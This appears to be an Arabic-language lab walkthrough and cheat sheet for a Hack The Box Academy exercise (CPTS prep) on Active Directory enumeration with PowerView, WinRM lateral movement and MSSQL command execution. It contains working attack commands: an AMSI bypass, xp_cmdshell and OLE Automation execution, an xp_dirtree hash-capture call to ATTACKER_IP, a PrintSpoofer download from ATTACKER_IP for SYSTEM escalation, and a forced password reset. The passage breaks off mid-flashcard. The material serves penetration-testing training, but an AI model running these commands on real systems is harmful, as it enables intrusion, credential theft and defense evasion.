━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (AD Lateral Movement & SQL Abuse Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية الهجوم:

١. احصل على موطئ قدم (Foothold) كـ يوزر عادي.

٢. نفذ SharpHound لجمع بيانات الـ AD الحالية.

٣. اسحب ملف .zip وافتحه بـ BloodHound.

٤. ابحث عن مسارات الاختراق الجانبية (CanPSRemote, AdminTo, SQLAdmin).

٥. استخدم أدوات (WinRM أو Impacket) للقفز للجهاز أو الخدمة الهدف.

٦. في حال SQL، قم بتفعيل xp_cmdshell لرفع الصلاحية من (صلاحية DB) إلى (صلاحية OS/RCE).

📐 جدول الأوامر الأساسية:

|**المجال**|**الهدف**|**الأمر**|
|---|---|---|
|Enum|تشغيل SharpHound|`.\SharpHound.exe -c All --zipfilename output.zip`|
|AD|بحث عن WinRM بسايفر|`MATCH p=(u)-[:CanPSRemote*1..]->(c) RETURN p`|
|Lat-Mov|RDP من اللينكس|`xfreerdp /v:IP /u:USER /p:PASS /dynamic-resolution`|
|Lat-Mov|WinRM من اللينكس|`evil-winrm -i IP -u USER -p PASS`|
|Lat-Mov|WinRM من الويندوز|`Enter-PSSession -ComputerName HOSTNAME -Credential $cred`|
|SQLi|الاتصال بـ SQL سيرفر|`mssqlclient.py domain/user:pass@IP -windows-auth`|
|SQLi|تفعيل RCE سريع|`enable_xp_cmdshell` (داخل mssqlclient)|
|SQLi|تفعيل RCE يدوي|`EXEC sp_configure 'show advanced options',1; RECONFIGURE;`|
|SQLi|تنفيذ أمر دوس (DOS)|`xp_cmdshell 'type C:\flag.txt'`|
|SQLi|اختطاف هاش NTLM|`EXEC master..xp_dirtree '\\ATTACKER_IP\share';`|

🚨 الفخوخ (لا تنساها):

❌ نسيان وضع `-windows-auth` عند استخدام `mssqlclient.py` لحسابات الدومين.

❌ نسيان كتابة الدومين قبل اسم المستخدم (domain/username).

❌ كتابة أوامر `xp_cmdshell` بدون وضعها بين Single Quotes (`' '`).

❌ الخلط بين `HasSession` (مجرد تواجد) وبين `AdminTo` أو `CanPSRemote` (صلاحية تحكم حقيقية).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة)

✅ كل المصطلحات (SQLi, XSS, SUID, Kerberoasting, PTH, stego...)

✅ كيفية التفكير (decision trees لكل نوع هجوم)

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر)

✅ الـ bypasses والـ variations والفخوخ

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪



تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

⚠️ ركز وياي كلش زين هنا، لأن هاي المرحلة هي اللي راح تفصل بين "مستخدم أدوات" (Script Kiddie) وبين "مخترق محترف" (Red Teamer/Pentester).

بالجزء الأول من هذا التحدي، اعتمدنا على أداة رسومية حلوة ومريحة اسمها BloodHound. مجرد كبسة زر، رسمتلنا خريطة الدومين (Active Directory) وطلعتلنا أقصر طريق للاختراق. بس بالواقع، وبامتحانات متقدمة مثل CPTS (Certified Penetration Testing Specialist)، الحياة مو دائماً وردية.

شنو القصة الكبيرة هنا؟

تخيل إنك دخلت لشركة، وحاولت تشغل SharpHound (البرنامج اللي يجمع بيانات للـ BloodHound)، بس تفاجأت إن برنامج الحماية (Windows Defender أو EDR) مسحه فوراً وطلع تنبيه لكل فريق الحماية (SOC). أو تخيل إن قاعدة البيانات مال BloodHound انضربت. هل توقف وترفع راية الاستسلام؟ أكيد لا.

الخلل الجوهري اللي نستغله بهذا الجزء هو "الاستكشاف اليدوي والصلاحيات المباشرة". بيئة الـ Active Directory مبنية على مبدأ "منو مسموحله يقرأ شنو". أي مستخدم عادي (Domain User) عنده صلاحية افتراضية إنه يسأل الدومين: "يابا، منو أعضاء الجروب الفلاني؟" أو "شنو صلاحيات هذا اليوزر؟". إحنا راح نستخدم أدوات تعتمد على سطر الأوامر (Command Line) مثل PowerView حتى نسأل هاي الأسئلة مباشرة للأنظمة، بدون ما نحتاج نرسم خريطة كاملة تلفت الانتباه. هاي التقنية يسموها Living off the Land (يعني تعيش على موارد الأرض/النظام نفسه بدون أدوات خارجية كثيرة).

وين يظهر هذا بالواقع؟

بكل عمليات الـ Red Teaming الاحترافية. المهاجمين يفضلون يكتبون أوامر PowerShell خفيفة تسحب بس المعلومات اللي يحتاجوها (Targeted Enumeration) بدل ما يسوون مسح شامل (Broad Enumeration) يخلي أنظمة المراقبة تصيح. وأيضاً، نشوفه بهجمات قواعد البيانات، المهاجم ما يستخدم أدوات معقدة، يستخدم سكريبت بايثون بسيط (مثل mssqlclient) يحاكي اتصال مسؤول قاعدة بيانات شرعي.

ثانياً، قصة تصعيد الصلاحيات عبر قواعد البيانات:

سيرفر الـ SQL مو مجرد مكان لحفظ الجداول. هو عبارة عن "نظام تشغيل مصغر" يشتغل فوق نظام تشغيل الويندوز. مايكروسوفت خلت بيه ميزة (xp_cmdshell) تسمح لمدير القاعدة إنه ينفذ أوامر ويندوز عادية. المشكلة وين؟ مرات هذا السيرفر يشتغل بصلاحيات عالية جداً (Service Account) يمتلك ميزة اسمها `SeImpersonatePrivilege`. إذا المهاجم كدر يتصل بقاعدة البيانات (لأن عنده باسورد اليوزر الإداري)، ويفعل تنفيذ الأوامر، راح يلقي نفسه داخل الويندوز، وممكن يصعد صلاحياته للـ SYSTEM (أعلى صلاحية بالويندوز) بلمح البصر!

شنو راح نتعلم بالنهاية من هذا الجزء؟

١. شلون نستغني عن BloodHound ونستكشف الدومين يدوياً باستخدام PowerView.

٢. شلون نتعامل وية الـ AV (مضاد الفيروسات) إذا مسح أدواتنا (AMSI Bypass).

٣. شلون نتصل بأجهزة الويندوز مباشرة بدون برامج خارجية (استخدام WinRM الداخلي).

٤. شلون نتخطى مشاكل قواعد البيانات وننفذ أوامر (RCE) بطرق بديلة ومتقدمة جداً.

━━━━━

🔵 المرحلة 1: المصطلحات

لازم نضبط المصطلحات قبل ما نكتب أي كود. اقرأها بتركيز لأن راح تتكرر ويانا هواي.

PowerView (أداة رؤية الطاقة)

- شنو يعني؟ سكريبت مكتوب بلغة PowerShell، يعتبر السكينة السويسرية لمخترقي الـ Active Directory. يسهلك عملية استخراج البيانات من الدومين (يوزرات، جروبات، صلاحيات) بأسطر بسيطة بدل ما تكتب أكواد معقدة تتصل بـ LDAP.
    
- وين يظهر بالأوامر؟ ما تكتب اسمه مباشرة، بس تستدعيه بـ `Import-Module` وبعدين تستخدم دواله مثل `Get-NetLocalGroupMember`.
    

Get-NetLocalGroupMember (جلب أعضاء المجموعة المحلية عبر الشبكة)

- شنو يعني؟ دالة داخل PowerView. وظيفتها تسأل جهاز معين بالشبكة: "انطيني قائمة بكل اليوزرات الموجودين بجروب معين عندك (مثلاً جروب الـ Administrators أو Remote Management)".
    
- مثال: نستخدمها وياها `-ComputerName` حتى نحدد الجهاز اللي نريد نسأله.
    

ACL / Access Control List (قائمة التحكم بالوصول)

- شنو يعني؟ هي قائمة القوانين المخفية اللي تحدد "منو يكدر يسوي شنو". مرات صلاحية الـ WinRM ما تجي من جروب، تجي من ACL مكتوب بيها "اليوزر x عنده حق التحكم الكامل (GenericAll) بالكمبيوتر y".
    
- وين يظهر بالأوامر؟ نستخدم دوال مثل `Get-DomainObjectAcl` حتى نقرأ هاي القوائم المعقدة.
    

Enter-PSSession (الدخول لجلسة باورشيل)

- شنو يعني؟ أمر أساسي مبني داخل الويندوز (مو أداة هاكر). يسمحلك تفتح "شاشة باورشيل" على كمبيوتر ثاني عبر الشبكة باستخدام بروتوكول WinRM. بالضبط مثل الـ SSH بس للويندوز.
    
- وين يظهر بالأوامر؟ نكتبه ونعطيه اسم الكمبيوتر `-ComputerName` وبيانات الدخول `-Credential`.
    

PSCredential (كائن بيانات الاعتماد)

- شنو يعني؟ الويندوز نظام نحس بالسكیورتي، ما يقبل تمررله الباسورد كنص عادي (Plain text) بأوامر الاتصال مثل `Enter-PSSession`. لازم تحول الباسورد إلى "نص آمن" (Secure String) وبعدين تعلبه داخل كائن اسمه PSCredential حتى الويندوز يثق بيك ويقبله.
    

AMSI / Antimalware Scan Interface (واجهة فحص البرامج الضارة)

- شنو يعني؟ ميزة قوية بالويندوز. أي سكريبت PowerShell تحاول تشغله، الـ AMSI راح يوقفه بالهواء (بالذاكرة - RAM) قبل لا يتنفذ، وياخذ نسخة منه يفحصها بالـ Windows Defender. إذا شاف بيه كود خبيث (مثل PowerView)، راح يبلوكه فوراً.
    
- الحل؟ نستخدم كود صغير يسمى "AMSI Bypass" يعمي عيون الـ AMSI للنافذة الحالية فقط.
    

SeImpersonatePrivilege (صلاحية انتحال الشخصية)

- شنو يعني؟ صلاحية خطيرة جداً بالويندوز تعطى عادةً للخدمات (Services) مثل خدمة الـ SQL أو خدمة الويب (IIS). تسمح للخدمة إنها "تنتحل" شخصية أي مستخدم يتصل بيها. كمهاجمين، نستخدم أدوات (مثل PrintSpoofer) حتى نجبر حساب الـ SYSTEM يتصل بينا، وننتحل شخصيته ونصير ملوك السيرفر!
    

T-SQL / Transact-SQL (لغة استعلامات مايكروسوفت)

- شنو يعني؟ هي لغة SQL العادية بس مايكروسوفت ضافت عليها إمكانيات برمجية ضخمة (مثل المتغيرات، الدوال الشرطية، وتفعيل إعدادات السيرفر).
    
- وين يظهر بالأوامر؟ لما نكتب `EXEC sp_configure`، هذا كود T-SQL مو SQL عادي.
    

Linked Server (السيرفر المرتبط)

- شنو يعني؟ ميزة بـ MS SQL تسمح لسيرفر قاعدة بيانات إنه يربط ويتصل بسيرفر ثاني. المهاجمين يموتون على هاي الميزة، لأن إذا اخترقوا سيرفر ضعيف، يكدرون ينفذون استعلامات من خلاله على السيرفر القوي المرتبط بيه (واللي ممكن يعطيهم صلاحيات أعلى).
    

OLE Automation (أتمتة ربط وتضمين الكائنات)

- شنو يعني؟ نظام قديم بالويندوز يسمح لبرامج مختلفة تحجي وية بعض. بـ SQL Server، اكو إجراءات مخزنة (Stored Procedures) تبدأ بـ `sp_OA` تسمحلك تنشئ كائنات ويندوز (مثل WScript.Shell) وتنفذ أوامر دوس. تُعتبر البديل الذهبي والمنقذ إذا كانت ميزة `xp_cmdshell` مقفولة وما تنفتح.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة التحدي:

أنت هسة تحاول تجاوب نفس الأسئلة السابقة (منو اليوزر اللي عنده WinRM؟ وعلى أي جهاز؟ واقرأ الـ Flag من الـ SQL)، لكن هالمرة مُنعنا من استخدام BloodHound ولازم نعتمد على التحليل اليدوي (Manual Enumeration) عبر PowerView والتفاعل المباشر من أنظمة الويندوز واللينكس.

🎯 معطيات السيناريو (نفسها لكن الأدوات اختلفت):

- جهاز الانطلاق: `10.129.85.172` (اسمك: `htb-student`).
    
- السيرفر الهدف للـ SQL: `172.16.5.150` (اليوزر: `damundsen`، الباسورد: `SQL1234!`).
    
- القيود: لا تستخدم BloodHound للأسئلة 1 و 2. نفذ بيدك.
    

🧭 كيف تفكر؟ — خريطة اتخاذ القرار (Decision Tree):

الهدف: إيجاد مسارات WinRM بدون خريطة جاهزة.

طريقة ١: هل أقدر أسأل الأجهزة مباشرة عن جروب "Remote Management Users"؟ (هذا الجروب هو اللي يعطي صلاحية WinRM).

├── نعم ← أستخدم PowerView دالة `Get-NetLocalGroupMember`.

│ ├── جربتها على MS01 ← طلعلي يوزر؟ عظيم.

│ ├── جربتها على DC01 ← طلعلي يوزر؟ ممتاز.

│ └── النتيجة: عرفت اليوزر (Q1) والجهاز (Q2).

└── ماذا لو طلعلي "Access Denied"؟ (جدار الحماية يمنعني أسأل الجهاز عن بعد).

└── أنتقل للطريقة ٢.

طريقة ٢: فحص الـ ACLs (القوائم المخفية بالدومين).

├── هل توجد صلاحية للـ WinRM مخفية كـ ACL مو كـ Group؟

└── أستخدم دالة `Get-DomainObjectAcl` بالـ PowerView للبحث المتقدم. (أبطأ لكن أدق).

الهدف: تنفيذ أوامر على SQL (السؤال الثالث) والتأكد من الاختراق.

├── اتصلت بالـ SQL بـ `mssqlclient.py`.

├── كتبت `enable_xp_cmdshell`.

│ ├── نجح؟ ← نفذ `xp_cmdshell 'type flag.txt'`.

│ └── فشل؟ (Access Denied) ← انتقل للـ "What If" واستخدم `T-SQL` اليدوي أو أدوات ثانية.

🗺️ خريطة الهجوم (Roadmap) بدون تنفيذ:

١. نستورد أداة PowerView لجلسة الـ PowerShell بالويندوز المبدئي.

٢. نفحص الجروبات المحلية للأجهزة بالشبكة حتى نصيد يوزر عنده WinRM.

٣. (اختياري كبديل) نفحص الـ ACLs إذا الجروبات ما فادتنا.

٤. نختبر الاتصال الفعلي باستخدام `Enter-PSSession` من الويندوز ونتأكد إن اليوزر يكدر يدخل.

٥. نرجع للينكس، نشغل أداة قواعد البيانات التابعة لـ Impacket ونتصل بالهدف.

٦. نفعل أداة تنفيذ الأوامر، نقرأ العلم، ونشيك إذا نكدر نصير SYSTEM.

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

هنا الشغل الثقيل. افتح الـ Terminal وركز، راح نطبق السيناريوهات خطوة بخطوة.

الخطوة ١: تحميل PowerView للذاكرة (Approach 3)

📌 ليش نسوي هاي الخطوة؟

PowerView مو أداة موجودة بالويندوز افتراضياً. هي سكريبت خارجي لازم "نستورده" لجلسة الباورشيل الحالية حتى نكدر نستخدم الأوامر السحرية مالته.

🔧 الأمر (داخل الباورشيل بجهاز MS01 المخترق مبدئياً):

PowerShell

```
Import-Module C:\Tools\PowerView.ps1
```

💡 ليش هذا الأمر؟

- `Import-Module`: أمر ويندوز يحمل دوال خارجية يخليها متاحة بالـ session مالتك. (مرات المسار يكون `C:\Tools\PowerSploit\Recon\PowerView.ps1` حسب إعداد المختبر).
    

الخطوة ٢: استكشاف أعضاء جروب WinRM يدوياً (إجابة Q1 & Q2)

📌 ليش نسوي هاي الخطوة؟

بدل ما ندور بكل الدومين، راح نوجه سؤال مباشر لعدة أجهزة: "منو عندكم بجروب Remote Management Users؟". هذا الجروب هو المسؤول عن إعطاء صلاحية الـ WinRM/PSRemote.

🔧 الأمر:

PowerShell

```
# فحص جهاز MS01
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# طريقة متقدمة للبحث بكل أجهزة الدومين تلقائياً (Loop):
$computers = Get-DomainComputer | Select-Object -ExpandProperty dnshostname
foreach ($computer in $computers) {
    Write-Host "`n[*] Checking: $computer" -ForegroundColor Cyan
    Get-NetLocalGroupMember -ComputerName $computer -GroupName "Remote Management Users" -ErrorAction SilentlyContinue
}
```

💡 ليش هاي الأوامر؟

- `Get-NetLocalGroupMember`: دالة PowerView تجيب أعضاء جروب محلي من جهاز بعيد.
    
- `-ComputerName`: اسم الهدف اللي نريد نسأله.
    
- `Get-DomainComputer`: تجيب كل الأجهزة المسجلة بالدومين.
    
- `foreach`: حلقة تكرار (Loop) تلف على كل جهاز وتنفذ الفحص، واللي ما يتجاوب تتجاهله عبر `-ErrorAction SilentlyContinue`.
    

📤 الـ Output المتوقع (بعد تنفيذ اللوب أو الفحص الفردي):

Plaintext

```
[*] Checking: ACADEMY-EA-MS01
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\wley
SID          : S-1-5-21-3842939050-3880317879-2865463114-1011
IsGroup      : False
IsDomain     : UNKNOWN
```

✅ الخطوة التالية:

من هذا الناتج، عرفنا الإجابات المطلوبة!

- اليوزر (Q1): `wley` (أو أي يوزر يطلعه لك المختبر مكان `[USERNAME]`).
    
- الكمبيوتر (Q2): `ACADEMY-EA-MS01` (من حقل ComputerName).
    

⏸️ Mini-check: هل طلعلك يوزر وجهاز؟ إذا طلعلك "The RPC server is unavailable"، معناها الجدار الناري يمنعك تسأل هذا الجهاز.

الخطوة ٣: البحث الأعمق عبر الـ ACLs (Approach 4 - بديل للطوارئ)

📌 ليش نسوي هاي الخطوة؟

إذا الخطوة السابقة طلعت فارغة أو كلها Access Denied، معناها الصلاحية ما انطوها للجروب مباشرة، بل تم إضافتها بشكل معقد كقاعدة (ACL) بالدومين نفسه. هنا ندور بالعمق.

🔧 الأمر:

PowerShell

```
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty" -and $_.ObjectType -match "ms-Mcs-AdmPwd"} | Select-Object SecurityIdentifier, ActiveDirectoryRights
```

💡 ليش هذا الأمر المعقد؟

هذا الكود يفحص كل جهاز بالدومين (`Get-DomainComputer`)، يسحب القوانين مالته (`Get-DomainObjectAcl`)، ويفلتر (`Where-Object`) بس الصلاحيات الخطيرة مثل `GenericAll` (تحكم كامل) للمسارات المتعلقة بالريموت والأدمن.

الخطوة ٤: إثبات الدخول عبر WinRM محلياً (Approach 5)

📌 ليش نسوي هاي الخطوة؟

اكتشفنا إن اليوزر `wley` (مثلاً) عنده دخول على `ACADEMY-EA-MS01`. خلونا نتأكد وندخل فعلاً من داخل الويندوز باستخدام باورشيل الأصلي (بدون أدوات اختراق). لنفترض إحنا نعرف باسورد هذا اليوزر من مراحل سابقة بالتحدي.

🔧 الأمر:

PowerShell

```
# 1. تحويل الباسورد إلى نص مشفر وآمن بالذاكرة
$password = ConvertTo-SecureString "Password_of_the_User" -AsPlainText -Force

# 2. تجهيز كائن تسجيل الدخول (اليوزر + الباسورد الآمن)
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\wley", $password)

# 3. فتح الاتصال الفعلي بالجهاز الهدف
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

💡 ليش هاي الخطوات؟

مثل ما شرحنا بالمصطلحات، الويندوز يرفض تمرير الباسورد كنص مباشر للـ `Enter-PSSession`. لازم نسويله `SecureString` ونجمعه وية اليوزر كـ `PSCredential`.

📤 الـ Output المتوقع:

Plaintext

```
[ACADEMY-EA-MS01]: PS C:\Users\wley\Documents> whoami
inlanefreight\wley
[ACADEMY-EA-MS01]: PS C:\Users\wley\Documents> hostname
ACADEMY-EA-MS01
```

ممتاز! الشاشة تغيرت وظهر اسم السيرفر بين قوسين مربعة `[ ]`. أنت هسة داخل السيرفر البعيد تنفذ أوامر. للرجوع تكتب `Exit-PSSession`.

📊 لحد هسة:

[x] استكشفنا الجروبات بـ PowerView ولقينا الهدف (Q1 & Q2) ✓

[x] تأكدنا من الدخول باستخدام Enter-PSSession ✓

[ ] بقى الهدف الأكبر: اختراق SQL Server وقراءة الـ Flag ← الخطوة الجاية.

الخطوة ٥: الهجوم على قاعدة البيانات (Approach 6 - Q3)

📌 ليش نسوي هاي الخطوة؟

هسة ننتقل لجهاز الكالي لينكس مالنا (أو Attack Host). عدنا معلومات إن اليوزر `damundsen` عنده صلاحيات Sysadmin على قاعدة بيانات بالـ IP `172.16.5.150` والباسورد ماله `SQL1234!`. راح نستخدم بايثون للاتصال.

🔧 الأمر (بالـ Terminal اللينكس):

Bash

```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

💡 ليش هذا الأمر؟

- `mssqlclient.py`: الأداة الخرافية من حزمة Impacket.
    
- `INLANEFREIGHT/DAMUNDSEN`: الدومين متبوع باسم اليوزر (الترتيب والـ slash جداً مهمات).
    
- `-windows-auth`: هذا المعامل يخبر السيرفر "أني جاي أصادقك كيوزر من الدومين (ويندوز) مو ديوزر محلي داخل قاعدة البيانات". بدون هذا الفلاج راح يفشل الاتصال!
    

📤 الـ Output المتوقع:

Plaintext

```
Impacket v0.9.25...
Password: [تكتب الباسورد SQL1234!]
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
SQL>
```

الخطوة ٦: تفعيل RCE وقراءة الـ Flag

📌 ليش نسوي هاي الخطوة؟

حصلنا سطر الأوامر مال الـ SQL. حالياً إحنا محبوسين بقاعدة البيانات. لازم نفعل ميزة `xp_cmdshell` حتى نكسر السجن وننفذ أوامر على سيرفر الويندوز الأساسي.

🔧 الأوامر:

SQL

```
-- 1. تفعيل الميزة
SQL> enable_xp_cmdshell

-- 2. معرفة صلاحيتنا بنظام التشغيل
SQL> xp_cmdshell whoami

-- 3. قراءة الـ Flag من الديسكتوب
SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
```

💡 ليش هاي الأوامر؟

- `enable_xp_cmdshell`: أمر مختصر من مبرمجي الأداة يختصرلك كود الـ T-SQL الطويل الخاص بالتفعيل.
    
- `xp_cmdshell`: هذا هو الإجراء السحري. أي شي تكتبه بعده (مثل `whoami` أو `type`) راح يروح يتنفذ بالـ CMD مال الويندوز وينردلك الناتج!
    

📤 الـ Output المتوقع:

Plaintext

```
SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
output                                                                             
--------------------------------------------------------------------------------   
HTB{M4nu4l_Enum_4nd_SQL_RCE_M4st3r}                                         
NULL
```

🎉 الكنـز بين إيديك!

رسم توضيحي (SQL RCE Attack Chain):

Plaintext

```
[Attacker (Linux)]
    │
    ├─ 1. mssqlclient.py (Auth as damundsen via port 1433)
    │
[SQL Server Application]
    │
    ├─ 2. enable_xp_cmdshell (Unlocks OS execution feature)
    │
    ├─ 3. xp_cmdshell 'type flag.txt'
    │
[Windows OS (ACADEMY-EA-DB01)]
    │
    └─ 4. Returns contents of file → Victory!
```

📐 ملخص الإجابات / النتائج:

|**الخطوة**|**الأداة**|**النتيجة**|
|---|---|---|
|Q1 & Q2 Enum|PowerView (Get-NetLocalGroupMember)|اليوزر: wley / الكمبيوتر: MS01|
|Q3 SQL Auth|mssqlclient.py|نجاح الاتصال وصلاحية SQLAdmin|
|Q3 PrivEsc|xp_cmdshell|تم الخروج لنظام التشغيل وقراءة العلم|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps) — The CPTS Masterclass!

هاي أهم فقرة للتحضير لامتحان CPTS. بالامتحان العملي أو اختبار الاختراق الحقيقي، الأداة ما راح تشتغل من أول مرة! ركز بالحلول البديلة (Bypasses).

🔄 Variations محتملة:

Variation 1: ماذا لو برنامج الحماية (AV) يمسح أدواتك فوراً؟ (AMSI Bypass)

- المشكلة: تجي تستورد `PowerView.ps1`، يطلعلك إيرور أحمر إن البرنامج خبيث.
    
- الحل (AMSI Bypass): نلغي تفعيل عين المراقبة مال الويندوز بالذاكرة قبل لا نحمل الأداة.
    
- الأمر المنقذ:
    

PowerShell

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Import-Module C:\Tools\PowerView.ps1
```

CPTS Tip: هذا كود AMSI كلاسيكي. بالامتحان الحديث ممكن يكون مكشوف، فلازم تتعلم تغير أسماء المتغيرات (Obfuscation). كبديل نظيف، استخدم دوال الويندوز الرسمية اللي مستحيل تنمسح:

PowerShell

```
Import-Module ActiveDirectory
Get-ADGroupMember -Identity "Remote Management Users" -Recursive
```

Variation 2: ماذا لو البورت 5985 (WinRM) مغلق بالجدار الناري؟

- المشكلة: عرفت اليوزر والجهاز، بس `Enter-PSSession` ينطي Timeout.
    
- الحل: الجدار الناري مرات يبلوك الـ HTTP (5985) بس ينسى يبلوك الـ HTTPS (5986)! أو نستخدم بروتوكول ثاني كلياً مثل SMB (بورت 445).
    
- الأمر (باستخدام SMB):
    

Bash

```
crackmapexec smb TARGET_IP -u USERNAME -p 'PASSWORD' -x "whoami"
```

Variation 3: ماذا لو أمر `enable_xp_cmdshell` فشل بـ mssqlclient؟

- المشكلة: الأداة ما تكدر تفعل الميزة برمجياً بسبب إعدادات حماية بالسيرفر.
    
- الحل: نكتب أكواد `T-SQL` يدوياً خطوة بخطوة بالـ SQL Prompt:
    

SQL

```
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```

Variation 4: ماذا لو ميزة xp_cmdshell مقفولة نهائياً وممنوع تفعلها؟

- الحل (OLE Automation): هاي طريقة الـ Hackers القدامى. نستخدم إجراءات الـ OLE حتى نخلق كائن بالويندوز ينفذلنا اللي نريده بصمت.
    
- الكود (داخل الـ SQL):
    

SQL

```
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', null, 'cmd /c whoami > C:\output.txt';
```

Variation 5: ماذا لو حاولت تقرأ الـ Flag بـ xp_cmdshell وطلعلك Access Denied؟

- المشكلة: ميزة `xp_cmdshell` تنفذ الأوامر بصلاحية حساب الخدمة (Service Account) مال الـ SQL (مثلاً `NT SERVICE\MSSQL$SQLEXPRESS`). هذا الحساب مرات ما عنده صلاحية يفتح فولدرات اليوزرات العاديين مثل `damundsen`.
    
- الحل (استغلال SeImpersonatePrivilege): بما إنه إحنا حساب خدمة، غالباً نملك صلاحية انتحال الشخصية! نصعد صلاحيتنا للـ SYSTEM باستخدام PrintSpoofer:
    

SQL

```
-- 1. نحمل أداة الاختراق للسيرفر من جهازنا اللينكس
SQL> xp_cmdshell "powershell -c (New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/PrintSpoofer64.exe','C:\Windows\Temp\ps.exe')"

-- 2. نشغل الأداة وننفذ أوامر كـ SYSTEM (أعلى صلاحية)
SQL> xp_cmdshell "C:\Windows\Temp\ps.exe -i -c 'type C:\Users\damundsen\Desktop\flag.txt'"
```

Variation 6: ماذا لو باسورد damundsen اللي عدنا (SQL1234!) طلع غلط؟ (Login Failed)

- المشكلة: باسورد قديم أو تغير باللاب.
    
- الحل: بالـ Active Directory، إذا عندك يوزر (مثل wley) يملك صلاحية `ForceChangePassword` أو تحكم بالـ ACL على اليوزر (damundsen)، تكدر تصفر باسورده من جديد!
    
- الأمر (بـ PowerView):
    

PowerShell

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$UserPassword = ConvertTo-SecureString 'SQL1234!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $UserPassword -Credential $Cred -Verbose
```

⚠️ أخطاء كارثية شائعة (الفخوخ):

🚨 فخ الـ mssqlclient الأكبر: نسيان معامل `-windows-auth`!

إذا حاولت تتصل بيوزر من الدومين (مثل damundsen) ونسيت هذا المعامل، الأداة راح تحاول تتصل بيه كـ "مستخدم محلي مخزون بقاعدة البيانات"، وراح تنطيك Login Failed حتى لو الباسورد صح مليون بالمية!

🚨 فخ الباورشيل: تجاهل السياسات (Execution Policy).

مرات تجي تشغل سكربت `PowerView.ps1` يعطيك إيرور إن السكربتات ممنوعة بهالجهاز. لازم تتخطاها بتشغيل الباورشيل بهذي الصيغة:

`powershell.exe -ExecutionPolicy Bypass`

🚨 فخ الـ SQL Output: ظهور كلمة `NULL` بنهاية المخرجات.

الطلاب المبتدئين من يشوفون كلمة `NULL` يخترعون عبالهم الأمر فشل. الـ NULL بـ xp_cmdshell تعني فقط "آخر سطر من الناتج كان فارغ"، هذا شيء طبيعي جداً. المهم هو النص اللي فوكها.

🔑 Golden Tips للـ CPTS:

"دائماً جهز ૩ طرق بديلة لكل مهمة. إذا BloodHound انحظر، استخدم PowerView. إذا PowerView انحظر (AMSI)، استخدم `Get-ADGroupMember` الأصلي. التفكير الجانبي هو اللي ينجحك بالامتحان، مو حفظ الأوامر."

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

❓ Front: كيف تتصل بـ WinRM يدوياً من ويندوز إلى ويندوز آخر؟

✅ Back: تجهز الـ credential ثم: `Enter-PSSession -ComputerName TARGET -Credential $cred`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

❓ Front: ما هو أمر PowerView لمعرفة أعضاء مجموعة محلية على جهاز بعيد؟

✅ Back: `Get-NetLocalGroupMember -ComputerName TARGET -GroupName "Remote Management Users"`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

❓ Front: كيف تفعل RCE داخل MS SQL يدوياً بـ T-SQL إذا فشلت الأدوات السريعة؟

✅ Back: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

❓ Front: لماذا يفشل اتصال mssqlclient.py بحسابات الدومين؟

✅ Back: بسبب نسيان إضافة الـ flag: `-windows-auth` (والذي يخبر الأداة باستخدام Kerberos/NTLM بدلاً من مصادقة SQL الداخلية).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

